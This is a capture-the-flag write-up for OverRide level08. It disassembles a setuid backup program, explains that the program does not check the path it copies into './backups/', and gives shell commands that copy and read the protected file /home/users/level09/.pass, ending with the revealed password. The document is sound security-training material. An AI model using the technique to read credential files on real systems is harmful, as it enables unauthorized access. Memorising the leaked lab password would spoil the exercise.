# **Level08**

## **Binary Analysis**

The program requires exactly one command-line argument to read from it and create a backup of its content.

```nasm
NASMCollapse

; Check for correct number of arguments
0x0000000000400a22 <+50>:    cmpl   $0x2,-0x94(%rbp)  ; Compare argc with 2
0x0000000000400a29 <+57>:    je     0x400a4a <main+90>

; Important part: Opening input file
0x0000000000400ab3 <+195>:   mov    $0x400da9,%edx    ; "r" mode for fopen
0x0000000000400ab8 <+200>:   mov    -0xa0(%rbp),%rax  ; Get argv
0x0000000000400abf <+207>:   add    $0x8,%rax         ; argv[1]
0x0000000000400acc <+220>:   callq  0x4007c0 <fopen@plt>

; Creating backup path
0x0000000000400b09 <+281>:   mov    $0x400dab,%edx    ; "./backups/"
0x0000000000400b0e <+286>:   lea    -0x70(%rbp),%rax  ; Buffer for path
0x0000000000400b7d <+397>:   callq  0x400750 <strncat@plt>

; Opening backup file
0x0000000000400b98 <+424>:   callq  0x4007b0 <open@plt>

; Reading and writing loop
0x0000000000400bf5 <+517>:   callq  0x400760 <fgetc@plt>
0x0000000000400be6 <+502>:   callq  0x400700 <write@plt>

```

## **Vulnerability**

The main problem with this program is that it does not check the file path given by the user. It simply adds "./backups/" to the filename and keeps the same folder structure.

This means:

    If we provide /home/users/level09/.pass as input:

    It will try to create the same directory structure inside "./backups/":

        ```bash
        ./backups/home/users/level09/.pass
        ```
    Since we can control where the backup is saved, we can trick the program into copying protected files to a place where we can read them.

## **Exploit**

The exploit strategy is to create a backup of the protected file '/home/users/level09/.pass' in '/tmp' where we have write permissions. Create mirror structure in /tmp

**Step 1: Prepare Environment**

```bash
# Go to /tmp where we have write permissions
cd /tmp

# Create required directory structure
mkdir -p backups/home/users/level09/
```

**Step 2: Execute Exploit**

```bash
# Run program with target file
~/level08 /home/users/level09/.pass
```

**Step 3: Extract Data**

```bash
BASH

# Read the backup file
cat /tmp/backups/home/users/level09/.pass
```

The final result:

```bash
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
level08@OverRide:/tmp$ ls
backups
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat /tmp/backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## **Flag**

```
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```